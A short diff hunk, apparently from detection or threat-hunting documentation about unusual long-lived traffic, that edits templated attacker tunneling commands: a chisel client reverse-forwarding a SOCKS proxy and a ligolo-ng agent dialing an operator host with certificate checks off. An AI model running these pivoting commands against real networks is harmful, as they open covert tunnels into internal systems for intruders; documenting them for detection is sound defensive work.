@@ -23,5 +23,5 @@ disproportionate, long-duration traffic.
 # chisel: attacker runs the server; victim connects out and reverse-forwards a SOCKS proxy
 chisel client https://{{lhost}}:{{port}} R:socks
 # ligolo-ng: agent dials the proxy, operator routes the internal subnet through the TUN
-ligolo-agent -connect {{lhost}}:{{port}} -ignore-cert
+agent -connect {{lhost}}:{{port}} -ignore-cert
 ```
